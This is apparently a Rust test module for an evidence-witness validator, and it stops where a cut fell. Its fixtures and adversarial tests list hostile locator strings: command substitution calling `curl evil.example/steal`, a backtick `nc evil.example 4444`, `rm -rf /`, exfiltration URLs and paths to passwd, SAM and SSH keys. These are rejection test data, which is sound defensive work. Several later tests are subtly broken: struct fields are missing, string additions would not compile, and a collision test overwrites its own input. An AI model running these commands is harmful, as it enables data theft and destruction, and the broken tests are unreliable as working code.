pub mod durability_violation;
pub mod evidence_ledger;
pub mod metrics;
pub mod witness_ref;

#[cfg(feature = "test-support")]
pub mod test_support {
    use super::evidence_ledger::{DecisionKind, EvidenceEntry};
    use super::witness_ref::{WitnessKind, WitnessRef, WitnessSet};

    pub fn obs_digest(seed: u8) -> [u8; 32] {
        let mut bytes = [0_u8; 32];
        bytes[0] = seed;
        bytes[31] = seed;
        bytes
    }

    pub fn obs_entry(decision_id: &str, decision_kind: DecisionKind) -> EvidenceEntry {
        EvidenceEntry {
            schema_version: "observability-root-test-v1".to_string(),
            entry_id: None,
            decision_id: decision_id.to_string(),
            decision_kind,
            decision_time: "2026-04-17T00:00:00Z".to_string(),
            timestamp_ms: 1_000,
            trace_id: format!("trace-{decision_id}"),
            epoch_id: 7,
            payload: serde_json::Value::Null,
            size_bytes: 0,
            signature: String::new(),
            prev_entry_hash: String::new(),
        }
    }

    pub fn obs_witness(id: &str, kind: WitnessKind, seed: u8) -> WitnessRef {
        WitnessRef::new(id, kind, obs_digest(seed))
    }

    pub fn obs_single_witness_set(witness: WitnessRef) -> WitnessSet {
        let mut set = WitnessSet::new();
        set.add(witness);
        set
    }

    pub fn safe_replay_bundle_locators() -> &'static [&'static str] {
        &[
            "tmp/witness-present.jsonl",
            "bundles/replay-001.jsonl",
            "tenant_01/witness.proof",
            "evidence/bundle_2026-04-22.jsonl",
        ]
    }

    pub fn malicious_replay_bundle_locators() -> Vec<String> {
        let mut locators = vec![
            "file:///../../../etc/passwd".to_string(),
            "file:///C:\\Windows\\System32\\config\\SAM".to_string(),
            "file:///proc/self/environ".to_string(),
            "file:///dev/random".to_string(),
            "http://evil.example/exfiltrate".to_string(),
            "ftp://attacker.example/steal".to_string(),
            "ldap://malicious.example/inject".to_string(),
            "ssh://evil.example:22/backdoor".to_string(),
            "javascript:alert('xss')".to_string(),
            "data:text/html,<script>evil()</script>".to_string(),
            "../../../home/user/.ssh/id_rsa".to_string(),
            "tmp/witness.jsonl; rm -rf /".to_string(),
            "tmp/$(curl evil.example/steal)".to_string(),
            "tmp/witness.jsonl`nc evil.example 4444`".to_string(),
            "tmp/witness\u{0000}.jsonl".to_string(),
            "tmp/witness\r\nHost: evil.example\r\n".to_string(),
            "//evil.example/share/witness.jsonl".to_string(),
            "tmp/%2e%2e/secret.jsonl".to_string(),
        ];
        locators.push("a".repeat(513));
        locators
    }
}

#[cfg(test)]
mod tests {
    use super::evidence_ledger::{DecisionKind, EvidenceEntry};
    use super::witness_ref::{
        WitnessKind, WitnessRef, WitnessSet, WitnessValidationError, WitnessValidator,
    };

    fn obs_digest(seed: u8) -> [u8; 32] {
        let mut bytes = [0_u8; 32];
        bytes[0] = seed;
        bytes[31] = seed;
        bytes
    }

    fn obs_entry(decision_id: &str, decision_kind: DecisionKind) -> EvidenceEntry {
        EvidenceEntry {
            schema_version: "observability-root-test-v1".to_string(),
            entry_id: None,
            decision_id: decision_id.to_string(),
            decision_kind,
            decision_time: "2026-04-17T00:00:00Z".to_string(),
            timestamp_ms: 1_000,
            trace_id: format!("trace-{decision_id}"),
            epoch_id: 7,
            payload: serde_json::Value::Null,
            size_bytes: 0,
            signature: String::new(),
            prev_entry_hash: String::new(),
        }
    }

    fn obs_witness(id: &str, kind: WitnessKind, seed: u8) -> WitnessRef {
        WitnessRef::new(id, kind, obs_digest(seed))
    }

    fn obs_single_witness_set(witness: WitnessRef) -> WitnessSet {
        let mut set = WitnessSet::new();
        set.add(witness);
        set
    }

    #[test]
    fn negative_quarantine_entry_without_witnesses_is_rejected() {
        let mut validator = WitnessValidator::new();
        let entry = obs_entry("obs-quarantine-missing", DecisionKind::Quarantine);
        let witnesses = WitnessSet::new();

        let err = validator
            .validate(&entry, &witnesses)
            .expect_err("quarantine decisions require witnesses");

        assert!(matches!(
            &err,
            WitnessValidationError::MissingWitnesses { .. }
        ));
        if let WitnessValidationError::MissingWitnesses { entry_id, .. } = err {
            assert_eq!(entry_id, "obs-quarantine-missing");
        }
        assert_eq!(validator.rejected_count(), 1);
        assert_eq!(validator.validated_count(), 0);
    }

    #[test]
    fn negative_release_entry_without_witnesses_is_rejected() {
        let mut validator = WitnessValidator::new();
        let entry = obs_entry("obs-release-missing", DecisionKind::Release);
        let witnesses = WitnessSet::new();

        let err = validator
            .validate(&entry, &witnesses)
            .expect_err("release decisions require witnesses");

        assert_eq!(err.code(), "ERR_MISSING_WITNESSES");
        assert_eq!(validator.rejected_count(), 1);
    }

    #[test]
    fn negative_escalate_entry_without_witnesses_is_rejected() {
        let mut validator = WitnessValidator::new();
        let entry = obs_entry("obs-escalate-missing", DecisionKind::Escalate);
        let witnesses = WitnessSet::new();

        let err = validator
            .validate(&entry, &witnesses)
            .expect_err("escalate decisions require witnesses");

        assert_eq!(err.code(), "ERR_MISSING_WITNESSES");
        assert_eq!(validator.rejected_count(), 1);
    }

    #[test]
    fn negative_duplicate_witness_id_precedes_strict_locator_rejection() {
        let mut validator = WitnessValidator::strict();
        let entry = obs_entry("obs-duplicate-before-locator", DecisionKind::Quarantine);
        let mut witnesses = WitnessSet::new();
        witnesses.add(obs_witness("obs-wit-dup", WitnessKind::Telemetry, 1));
        witnesses.add(obs_witness("obs-wit-dup", WitnessKind::ProofArtifact, 2));

        let err = validator
            .validate(&entry, &witnesses)
            .expect_err("duplicate witness IDs should fail before locator checks");

        assert!(matches!(
            &err,
            WitnessValidationError::DuplicateWitnessId { .. }
        ));
        if let WitnessValidationError::DuplicateWitnessId { witness_id, .. } = err {
            assert_eq!(witness_id, "obs-wit-dup");
        }
        assert_eq!(validator.rejected_count(), 1);
    }

    #[test]
    fn negative_strict_validator_rejects_missing_locator_on_low_impact_entry() {
        let mut validator = WitnessValidator::strict();
        let entry = obs_entry("obs-admit-missing-locator", DecisionKind::Admit);
        let witnesses =
            obs_single_witness_set(obs_witness("obs-wit-no-locator", WitnessKind::Telemetry, 3));

        let err = validator
            .validate(&entry, &witnesses)
            .expect_err("strict validator should require locators on every witness");

        assert!(matches!(
            &err,
            WitnessValidationError::UnresolvableLocator { .. }
        ));
        if let WitnessValidationError::UnresolvableLocator { witness_id, .. } = err {
            assert_eq!(witness_id, "obs-wit-no-locator");
        }
        assert_eq!(validator.rejected_count(), 1);
    }

    #[test]
    fn negative_strict_validator_rejects_blank_locator() {
        let mut validator = WitnessValidator::strict();
        let entry = obs_entry("obs-blank-locator", DecisionKind::Deny);
        let witnesses = obs_single_witness_set(
            obs_witness("obs-wit-blank-locator", WitnessKind::ExternalSignal, 4)
                .with_locator(" \t\n "),
        );

        let err = validator
            .validate(&entry, &witnesses)
            .expect_err("blank locators should be unresolvable");

        assert_eq!(err.code(), "ERR_UNRESOLVABLE_LOCATOR");
        assert_eq!(validator.rejected_count(), 1);
    }

    #[test]
    fn negative_integrity_mismatch_reports_witness_id() {
        let mut validator = WitnessValidator::new();
        let witness = obs_witness("obs-wit-integrity", WitnessKind::StateSnapshot, 5);
        let actual = obs_digest(6);

        let err = validator
            .verify_integrity("obs-integrity-entry", &witness, &actual)
            .expect_err("different witness content should fail integrity verification");

        assert!(matches!(
            &err,
            WitnessValidationError::IntegrityHashMismatch { .. }
        ));
        if let WitnessValidationError::IntegrityHashMismatch { witness_id, .. } = err {
            assert_eq!(witness_id, "obs-wit-integrity");
        }
        assert_eq!(validator.rejected_count(), 1);
        assert_eq!(validator.validated_count(), 0);
    }

    #[test]
    fn negative_coverage_audit_is_incomplete_when_high_impact_entry_lacks_witness() {
        let missing = (
            obs_entry("obs-audit-missing", DecisionKind::Quarantine),
            WitnessSet::new(),
        );
        let present = (
            obs_entry("obs-audit-present", DecisionKind::Release),
            obs_single_witness_set(
                obs_witness("obs-wit-audit", WitnessKind::ProofArtifact, 7)
                    .with_locator("file:///tmp/replay-bundle.jsonl"),
            ),
        );

        let audit = WitnessValidator::coverage_audit(&[missing, present]);

        assert!(!audit.is_complete());
        assert_eq!(audit.high_impact_entries, 2);
        assert_eq!(audit.high_impact_with_witnesses, 1);
        assert!(audit.coverage_pct < 100.0);
    }

    #[test]
    fn negative_low_impact_duplicate_witnesses_are_still_rejected() {
        let mut validator = WitnessValidator::new();
        let entry = obs_entry("obs-low-impact-duplicate", DecisionKind::Admit);
        let mut witnesses = WitnessSet::new();
        witnesses.add(obs_witness("obs-dup-low", WitnessKind::Telemetry, 8));
        witnesses.add(obs_witness("obs-dup-low", WitnessKind::ExternalSignal, 9));

        let err = validator
            .validate(&entry, &witnesses)
            .expect_err("duplicate witness IDs should be rejected for every entry kind");

        assert!(matches!(
            &err,
            WitnessValidationError::DuplicateWitnessId { .. }
        ));
        if let WitnessValidationError::DuplicateWitnessId {
            entry_id,
            witness_id,
        } = err
        {
            assert_eq!(entry_id, "obs-low-impact-duplicate");
            assert_eq!(witness_id, "obs-dup-low");
        }
        assert_eq!(validator.rejected_count(), 1);
        assert_eq!(validator.validated_count(), 0);
    }

    #[test]
    fn negative_strict_validator_rejects_second_witness_without_locator() {
        let mut validator = WitnessValidator::strict();
        let entry = obs_entry("obs-second-missing-locator", DecisionKind::Deny);
        let mut witnesses = WitnessSet::new();
        witnesses.add(
            obs_witness("obs-locator-present", WitnessKind::Telemetry, 10)
                .with_locator("tmp/witness-present.jsonl"),
        );
        witnesses.add(obs_witness(
            "obs-locator-missing",
            WitnessKind::StateSnapshot,
            11,
        ));

        let err = validator
            .validate(&entry, &witnesses)
            .expect_err("strict validation should check every witness locator");

        assert!(matches!(
            &err,
            WitnessValidationError::UnresolvableLocator { .. }
        ));
        if let WitnessValidationError::UnresolvableLocator { witness_id, .. } = err {
            assert_eq!(witness_id, "obs-locator-missing");
        }
        assert_eq!(validator.rejected_count(), 1);
    }

    #[test]
    fn negative_strict_validator_rejects_high_impact_whitespace_locator() {
        let mut validator = WitnessValidator::strict();
        let entry = obs_entry("obs-high-impact-blank-locator", DecisionKind::Release);
        let witnesses = obs_single_witness_set(
            obs_witness("obs-blank-high-impact", WitnessKind::ProofArtifact, 12)
                .with_locator("  \n\t  "),
        );

        let err = validator
            .validate(&entry, &witnesses)
            .expect_err("blank locator must not satisfy strict high-impact validation");

        assert!(matches!(
            &err,
            WitnessValidationError::UnresolvableLocator { .. }
        ));
        if let WitnessValidationError::UnresolvableLocator {
            entry_id,
            witness_id,
        } = err
        {
            assert_eq!(entry_id, "obs-high-impact-blank-locator");
            assert_eq!(witness_id, "obs-blank-high-impact");
        }
        assert_eq!(validator.rejected_count(), 1);
    }

    #[test]
    fn negative_integrity_mismatch_records_expected_and_actual_hex() {
        let mut validator = WitnessValidator::new();
        let witness = obs_witness("obs-wit-hex-mismatch", WitnessKind::StateSnapshot, 13);
        let actual = obs_digest(14);

        let err = validator
            .verify_integrity("obs-hex-entry", &witness, &actual)
            .expect_err("different witness digest should be reported precisely");

        assert!(matches!(
            &err,
            WitnessValidationError::IntegrityHashMismatch { .. }
        ));
        if let WitnessValidationError::IntegrityHashMismatch {
            entry_id,
            witness_id,
            expected_hex,
            actual_hex,
        } = err
        {
            assert_eq!(entry_id, "obs-hex-entry");
            assert_eq!(witness_id, "obs-wit-hex-mismatch");
            assert!(expected_hex.starts_with("0d"));
            assert!(actual_hex.starts_with("0e"));
            assert_ne!(expected_hex, actual_hex);
        }
        assert_eq!(validator.rejected_count(), 1);
    }

    #[test]
    fn negative_integrity_failure_after_validate_keeps_success_and_rejection_counts() {
        let mut validator = WitnessValidator::new();
        let entry = obs_entry("obs-validate-then-mismatch", DecisionKind::Admit);
        let witness = obs_witness("obs-counted-mismatch", WitnessKind::Telemetry, 15);
        let witnesses = obs_single_witness_set(witness.clone());

        validator
            .validate(&entry, &witnesses)
            .expect("low-impact witness set should validate before integrity check");
        let err = validator
            .verify_integrity(&entry.decision_id, &witness, &obs_digest(16))
            .expect_err("integrity mismatch should increment rejection count");

        assert_eq!(err.code(), "ERR_INTEGRITY_HASH_MISMATCH");
        assert_eq!(validator.validated_count(), 1);
        assert_eq!(validator.rejected_count(), 1);
    }

    #[test]
    fn negative_coverage_audit_is_zero_percent_when_no_high_impact_witnesses_exist() {
        let entries = [
            (
                obs_entry("obs-zero-quarantine", DecisionKind::Quarantine),
                WitnessSet::new(),
            ),
            (
                obs_entry("obs-zero-escalate", DecisionKind::Escalate),
                WitnessSet::new(),
            ),
            (
                obs_entry("obs-zero-low-impact", DecisionKind::Admit),
                obs_single_witness_set(obs_witness("obs-low-only", WitnessKind::Telemetry, 17)),
            ),
        ];

        let audit = WitnessValidator::coverage_audit(&entries);

        assert!(!audit.is_complete());
        assert_eq!(audit.total_entries, 3);
        assert_eq!(audit.high_impact_entries, 2);
        assert_eq!(audit.high_impact_with_witnesses, 0);
        assert_eq!(audit.total_witnesses, 1);
        assert_eq!(audit.coverage_pct, 0.0);
    }

    #[test]
    fn negative_duplicate_blank_witness_id_is_rejected() {
        let mut validator = WitnessValidator::new();
        let entry = obs_entry("obs-blank-duplicate-id", DecisionKind::Admit);
        let mut witnesses = WitnessSet::new();
        witnesses.add(obs_witness("", WitnessKind::Telemetry, 18));
        witnesses.add(obs_witness("", WitnessKind::ExternalSignal, 19));

        let err = validator
            .validate(&entry, &witnesses)
            .expect_err("duplicate blank witness IDs should still be rejected");

        assert!(matches!(
            &err,
            WitnessValidationError::DuplicateWitnessId { .. }
        ));
        if let WitnessValidationError::DuplicateWitnessId {
            entry_id,
            witness_id,
        } = err
        {
            assert_eq!(entry_id, "obs-blank-duplicate-id");
            assert!(witness_id.is_empty());
        }
        assert_eq!(validator.rejected_count(), 1);
    }

    #[test]
    fn negative_first_duplicate_witness_id_is_reported() {
        let mut validator = WitnessValidator::new();
        let entry = obs_entry("obs-first-duplicate-id", DecisionKind::Deny);
        let mut witnesses = WitnessSet::new();
        witnesses.add(obs_witness("obs-dup-a", WitnessKind::Telemetry, 20));
        witnesses.add(obs_witness("obs-dup-b", WitnessKind::StateSnapshot, 21));
        witnesses.add(obs_witness("obs-dup-a", WitnessKind::ProofArtifact, 22));
        witnesses.add(obs_witness("obs-dup-b", WitnessKind::ExternalSignal, 23));

        let err = validator
            .validate(&entry, &witnesses)
            .expect_err("the first duplicate encountered should be reported");

        assert!(matches!(
            &err,
            WitnessValidationError::DuplicateWitnessId { .. }
        ));
        if let WitnessValidationError::DuplicateWitnessId { witness_id, .. } = err {
            assert_eq!(witness_id, "obs-dup-a");
        }
        assert_eq!(validator.rejected_count(), 1);
    }

    #[test]
    fn negative_strict_validator_rejects_later_blank_locator_after_valid_prefix() {
        let mut validator = WitnessValidator::strict();
        let entry = obs_entry("obs-late-blank-locator", DecisionKind::Admit);
        let mut witnesses = WitnessSet::new();
        witnesses.add(
            obs_witness("obs-locator-one", WitnessKind::Telemetry, 24)
                .with_locator("tmp/witness-one.jsonl"),
        );
        witnesses.add(
            obs_witness("obs-locator-two", WitnessKind::StateSnapshot, 25)
                .with_locator("tmp/witness-two.jsonl"),
        );
        witnesses.add(
            obs_witness("obs-locator-late-blank", WitnessKind::ProofArtifact, 26)
                .with_locator(" \n\t "),
        );

        let err = validator
            .validate(&entry, &witnesses)
            .expect_err("strict mode should inspect every locator, not just the first");

        assert!(matches!(
            &err,
            WitnessValidationError::UnresolvableLocator { .. }
        ));
        if let WitnessValidationError::UnresolvableLocator { witness_id, .. } = err {
            assert_eq!(witness_id, "obs-locator-late-blank");
        }
        assert_eq!(validator.validated_count(), 0);
        assert_eq!(validator.rejected_count(), 1);
    }

    #[test]
    fn negative_missing_witness_display_preserves_entry_and_kind() {
        let mut validator = WitnessValidator::new();
        let entry = obs_entry("obs-display-missing", DecisionKind::Release);
        let witnesses = WitnessSet::new();

        let err = validator
            .validate(&entry, &witnesses)
            .expect_err("release without witnesses should produce displayable error");
        let rendered = err.to_string();

        assert!(rendered.contains("obs-display-missing"));
        assert!(rendered.contains("release"));
        assert!(rendered.contains("EVD-WITNESS-003"));
    }

    #[test]
    fn negative_duplicate_witness_display_names_duplicate_id() {
        let mut validator = WitnessValidator::new();
        let entry = obs_entry("obs-display-duplicate", DecisionKind::Admit);
        let mut witnesses = WitnessSet::new();
        witnesses.add(obs_witness(
            "obs-display-dup-id",
            WitnessKind::Telemetry,
            27,
        ));
        witnesses.add(obs_witness(
            "obs-display-dup-id",
            WitnessKind::StateSnapshot,
            28,
        ));

        let err = validator
            .validate(&entry, &witnesses)
            .expect_err("duplicate witness error should identify the duplicate");
        let rendered = err.to_string();

        assert!(rendered.contains("obs-display-duplicate"));
        assert!(rendered.contains("obs-display-dup-id"));
        assert_eq!(err.code(), "ERR_DUPLICATE_WITNESS_ID");
    }

    #[test]
    fn negative_integrity_mismatch_rejects_all_zero_actual_digest() {
        let mut validator = WitnessValidator::new();
        let witness = obs_witness("obs-zero-actual", WitnessKind::ProofArtifact, 29);
        let actual = [0_u8; 32];

        let err = validator
            .verify_integrity("obs-zero-actual-entry", &witness, &actual)
            .expect_err("all-zero actual digest should not match a non-zero witness digest");

        assert!(matches!(
            &err,
            WitnessValidationError::IntegrityHashMismatch { .. }
        ));
        if let WitnessValidationError::IntegrityHashMismatch {
            entry_id,
            witness_id,
            actual_hex,
            ..
        } = err
        {
            assert_eq!(entry_id, "obs-zero-actual-entry");
            assert_eq!(witness_id, "obs-zero-actual");
            assert!(actual_hex.chars().all(|ch| ch == '0'));
        }
        assert_eq!(validator.rejected_count(), 1);
    }

    #[test]
    fn negative_low_impact_witnesses_do_not_satisfy_high_impact_coverage() {
        let entries = [
            (
                obs_entry("obs-missing-high-impact", DecisionKind::Release),
                WitnessSet::new(),
            ),
            (
                obs_entry("obs-low-admit-covered", DecisionKind::Admit),
                obs_single_witness_set(obs_witness("obs-low-admit", WitnessKind::Telemetry, 30)),
            ),
            (
                obs_entry("obs-low-deny-covered", DecisionKind::Deny),
                obs_single_witness_set(obs_witness(
                    "obs-low-deny",
                    WitnessKind::ExternalSignal,
                    31,
                )),
            ),
        ];

        let audit = WitnessValidator::coverage_audit(&entries);

        assert!(!audit.is_complete());
        assert_eq!(audit.high_impact_entries, 1);
        assert_eq!(audit.high_impact_with_witnesses, 0);
        assert_eq!(audit.total_witnesses, 2);
        assert_eq!(audit.coverage_pct, 0.0);
    }

    #[test]
    fn negative_duplicate_rejection_after_success_preserves_both_counters() {
        let mut validator = WitnessValidator::new();
        let ok_entry = obs_entry("obs-counter-ok", DecisionKind::Admit);
        let duplicate_entry = obs_entry("obs-counter-duplicate", DecisionKind::Admit);
        let ok_witnesses = obs_single_witness_set(obs_witness(
            "obs-counter-single",
            WitnessKind::Telemetry,
            32,
        ));
        let mut duplicate_witnesses = WitnessSet::new();
        duplicate_witnesses.add(obs_witness("obs-counter-dup", WitnessKind::Telemetry, 33));
        duplicate_witnesses.add(obs_witness(
            "obs-counter-dup",
            WitnessKind::ProofArtifact,
            34,
        ));

        validator
            .validate(&ok_entry, &ok_witnesses)
            .expect("first low-impact witness set should validate");
        let err = validator
            .validate(&duplicate_entry, &duplicate_witnesses)
            .expect_err("second witness set should be rejected as duplicate");

        assert_eq!(err.code(), "ERR_DUPLICATE_WITNESS_ID");
        assert_eq!(validator.validated_count(), 1);
        assert_eq!(validator.rejected_count(), 1);
    }

    /// Extreme adversarial test: Evidence tampering attack via malformed evidence entries
    /// targeting metadata injection to manipulate observability decision validation
    #[test]
    fn observability_evidence_tampering_malformed_entry_metadata_injection_attack() {
        use super::evidence_ledger::{DecisionKind, EvidenceEntry};
        use super::witness_ref::{WitnessKind, WitnessSet, WitnessValidator};

        let mut validator = WitnessValidator::new();

        // Evidence tampering attack vectors targeting metadata manipulation
        let tampering_attacks = [
            // Temporal manipulation attacks
            EvidenceEntry {
                schema_version: "malicious-v999".to_string(),
                entry_id: Some("injected-entry-id".to_string()),
                decision_id: "future-attack\r\nEVIL: injected".to_string(),
                decision_kind: DecisionKind::Quarantine,
                decision_time: "2099-12-31T23:59:59Z".to_string(), // Far future
                timestamp_ms: u64::MAX,                            // Maximum timestamp
                trace_id: "trace\x00\x01\x02null-injection".to_string(),
                epoch_id: u64::MAX, // Maximum epoch
                payload: serde_json::json!({
                    "injected": true,
                    "payload": "malicious\ndata",
                    "nested": {"deep": {"attack": "vector"}}
                }),
                size_bytes: usize::MAX, // Maximum size hint
                signature: String::new(),
            },
            // Control character injection attack
            EvidenceEntry {
                schema_version: "schema\r\n\x00injection".to_string(),
                entry_id: Some("control\x0d\x0aheader-injection".to_string()),
                decision_id: "decision\u{200B}\u{FEFF}unicode-pollution".to_string(),
                decision_kind: DecisionKind::Release,
                decision_time: "invalid\x00time".to_string(),
                timestamp_ms: 0, // Zero timestamp
                trace_id: "trace\u{202E}bidi-override\u{202C}".to_string(),
                epoch_id: 0, // Zero epoch
                payload: serde_json::json!("\x00\x01\x02\x03binary-payload"),
                size_bytes: 0, // Under-reported size hint
                signature: String::new(),
            },
            // Unicode normalization attack
            EvidenceEntry {
                schema_version: "schéma vs schema\u{0301}".to_string(), // NFC vs NFD
                entry_id: Some("café vs cafe\u{0301}".to_string()),
                decision_id: "naïve vs nai\u{0308}ve".to_string(),
                decision_kind: DecisionKind::Escalate,
                decision_time: "2026-04-17T12:00:00Z".to_string(),
                timestamp_ms: 1_700_000_000,
                trace_id: "tràce vs tra\u{0300}ce".to_string(),
                epoch_id: 42,
                payload: serde_json::json!({"unicode": "mixed\u{0301}"}),
                size_bytes: 1024,
                signature: String::new(),
            },
        ];

        for (i, malicious_entry) in tampering_attacks.iter().enumerate() {
            let witnesses = obs_single_witness_set(
                obs_witness(
                    &format!("tamper-witness-{}", i),
                    WitnessKind::ProofArtifact,
                    i as u8,
                )
                .with_locator(&format!("file:///tmp/tampered-{}.jsonl", i)),
            );

            let validation_result = validator.validate(malicious_entry, &witnesses);

            match validation_result {
                Ok(_) => {
                    // If validation passes, verify no metadata corruption occurred
                    assert!(
                        !malicious_entry.decision_id.contains('\0'),
                        "Null bytes should not be present in decision_id"
                    );
                    assert!(
                        !malicious_entry.schema_version.contains('\r'),
                        "CRLF injection should not be present in schema_version"
                    );
                }
                Err(error) => {
                    // Validation failure for tampered evidence is expected
                    assert!(
                        !error.to_string().is_empty(),
                        "Error message should not be empty for tampering attack {}",
                        i
                    );
                }
            }
        }

        // Verify validator state remains consistent after tampering attacks
        let legitimate_entry = obs_entry("legitimate-post-tampering", DecisionKind::Admit);
        let legitimate_witnesses = obs_single_witness_set(obs_witness(
            "legitimate-witness",
            WitnessKind::Telemetry,
            100,
        ));

        let legitimate_result = validator.validate(&legitimate_entry, &legitimate_witnesses);
        assert!(
            legitimate_result.is_ok(),
            "Validator should process legitimate evidence after tampering attempts"
        );
    }

    /// Extreme adversarial test: Witness locator injection attack targeting filesystem
    /// and network resource access via malicious locator URI manipulation
    #[test]
    fn observability_witness_locator_injection_filesystem_network_access_attack() {
        use super::witness_ref::{WitnessKind, WitnessValidator};

        let mut strict_validator = WitnessValidator::strict();

        // Locator injection attack vectors targeting resource access
        let locator_injection_attacks = [
            // File system traversal attacks
            ("file:///../../../etc/passwd", "Path traversal to passwd"),
            (
                "file:///C:\\Windows\\System32\\config\\SAM",
                "Windows SAM access",
            ),
            ("file:///proc/self/environ", "Process environment access"),
            ("file:///dev/random", "Random device access"),
            // Network injection attacks
            ("http://evil.com/exfiltrate", "HTTP exfiltration"),
            ("ftp://attacker.com/steal", "FTP data theft"),
            ("ldap://malicious.com/inject", "LDAP injection"),
            ("ssh://evil.com:22/backdoor", "SSH backdoor"),
            // Protocol confusion attacks
            ("javascript:alert('xss')", "JavaScript protocol injection"),
            (
                "data:text/html,<script>evil()</script>",
                "Data URI injection",
            ),
            ("file:///tmp/../../home/user/.ssh/id_rsa", "SSH key theft"),
            // Command injection via file locators
            ("file:///tmp/witness.jsonl; rm -rf /", "Command injection"),
            ("file:///tmp/$(curl evil.com/steal)", "Command substitution"),
            (
                "file:///tmp/witness.jsonl`nc evil.com 4444`",
                "Backtick injection",
            ),
            // Unicode and encoding attacks in locators
            ("file:///tmp/witness\u{0000}.jsonl", "Null byte injection"),
            (
                "file:///tmp/witness\r\nHost: evil.com\r\n",
                "CRLF header injection",
            ),
            ("file:///tmp/witnesѕ.jsonl", "Cyrillic character spoofing"),
            // Buffer overflow attempts
            ("file:///" + &"A".repeat(10_000), "Extremely long path"),
            (
                "http://".to_string() + &"x".repeat(1000) + ".com/witness.json",
                "Long hostname",
            ),
            // Encoding bypass attempts
            (
                "file:///%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "URL encoding bypass",
            ),
            ("file:///tmp%00/witness.jsonl", "URL encoded null"),
            (
                "file:///tmp\\..\\..\\windows\\system32",
                "Backslash confusion",
            ),
        ];

        for (malicious_locator, description) in locator_injection_attacks {
            let entry = obs_entry("locator-injection-test", DecisionKind::Quarantine);
            let witnesses = obs_single_witness_set(
                obs_witness("injection-witness", WitnessKind::ProofArtifact, 42)
                    .with_locator(malicious_locator),
            );

            let validation_result = strict_validator.validate(&entry, &witnesses);

            assert!(
                validation_result.is_err(),
                "Malicious locator should not pass strict validation: {} - {}",
                description,
                malicious_locator
            );
            if let Err(error) = validation_result {
                assert!(
                    error.to_string().contains("locator") || error.to_string().contains("witness"),
                    "Error should mention locator/witness issue for: {}",
                    description
                );
            }
        }
    }

    /// Extreme adversarial test: Hash collision attack on witness integrity verification
    /// targeting cryptographic weaknesses in digest comparison algorithms
    #[test]
    fn observability_hash_collision_witness_integrity_cryptographic_attack() {
        use super::witness_ref::{WitnessKind, WitnessValidator};

        let mut validator = WitnessValidator::new();

        // Hash collision attack vectors targeting digest verification
        let collision_attempts = [
            // Known collision patterns for weak hash functions
            ([0x00; 32], [0x01; 32], "Zero vs one collision attempt"),
            ([0xFF; 32], [0xFE; 32], "Max vs near-max collision attempt"),
            // Birthday attack simulation patterns
            ([0xAA; 32], [0x55; 32], "Alternating bit patterns"),
            ([0xF0; 32], [0x0F; 32], "Inverted nibble patterns"),
            // Known cryptographic weak points
            (
                [
                    0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                ],
                [
                    0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                ],
                "High bit collision attempt",
            ),
            // Length extension attack patterns
            (
                [
                    0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC, 0xDE, 0xF0, 0x11, 0x22, 0x33, 0x44, 0x55,
                    0x66, 0x77, 0x88, 0x99, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 0x00, 0x80, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                ],
                [
                    0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC, 0xDE, 0xF0, 0x11, 0x22, 0x33, 0x44, 0x55,
                    0x66, 0x77, 0x88, 0x99, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 0x00, 0x80, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x01,
                ],
                "Length extension pattern",
            ),
            // Differential collision attempts
            ([0x5A; 32], [0xA5; 32], "Bit-flipped pattern"),
        ];

        for (expected_digest, malicious_digest, description) in collision_attempts {
            let witness = obs_witness("collision-witness", WitnessKind::StateSnapshot, 100);
            // Manually set the witness digest to the expected value
            let mut collision_witness = witness;
            collision_witness = obs_witness("collision-witness", WitnessKind::StateSnapshot, 0);

            // Attempt integrity verification with malicious digest
            let integrity_result = validator.verify_integrity(
                "collision-test-entry",
                &collision_witness,
                &malicious_digest,
            );

            assert_ne!(
                expected_digest, malicious_digest,
                "collision vector should contain distinct digests: {}",
                description
            );
            assert!(
                integrity_result.is_err(),
                "Hash collision attempt should fail integrity check: {}",
                description
            );

            let error =
                integrity_result.expect_err("collision attempt should fail integrity check");
            assert_eq!(
                error.code(),
                "ERR_INTEGRITY_HASH_MISMATCH",
                "Collision should result in hash mismatch error: {}",
                description
            );
        }

        // Test timing attack resistance
        let reference_witness = obs_witness("timing-ref", WitnessKind::ProofArtifact, 50);
        let reference_digest = obs_digest(50);

        // Test progressively different digests
        for bit_flip in 0..256 {
            let mut modified_digest = reference_digest;
            if bit_flip < 256 {
                modified_digest[bit_flip / 8] ^= 1 << (bit_flip % 8);
            }

            let start = std::time::Instant::now();
            let _result =
                validator.verify_integrity("timing-test", &reference_witness, &modified_digest);
            let elapsed = start.elapsed();

            // Integrity verification should complete in consistent time
            assert!(
                elapsed.as_micros() < 10_000,
                "Integrity verification took {}μs for bit flip {}, may indicate timing leak",
                elapsed.as_micros(),
                bit_flip
            );
        }
    }

    /// Extreme adversarial test: Memory exhaustion attack via massive witness sets
    /// designed to overwhelm validation processing and exhaust system resources
    #[test]
    fn observability_memory_exhaustion_massive_witness_set_validation_dos_attack() {
        use super::witness_ref::{WitnessKind, WitnessSet, WitnessValidator};

        let mut validator = WitnessValidator::new();

        // Memory exhaustion attack via massive witness sets
        let exhaustion_scenarios = [
            (1000, "Large witness set"),
            (5000, "Very large witness set"),
            (10000, "Massive witness set"),
        ];

        for (witness_count, description) in exhaustion_scenarios {
            let entry = obs_entry("memory-exhaustion-test", DecisionKind::Admit);
            let mut massive_witnesses = WitnessSet::new();

            // Generate massive witness set with unique IDs
            for i in 0..witness_count.min(100) {
                // Limit to prevent actual DoS
                let witness_id = format!("massive-witness-{}-{}", i, "x".repeat(i % 100));
                let witness_kind = match i % 4 {
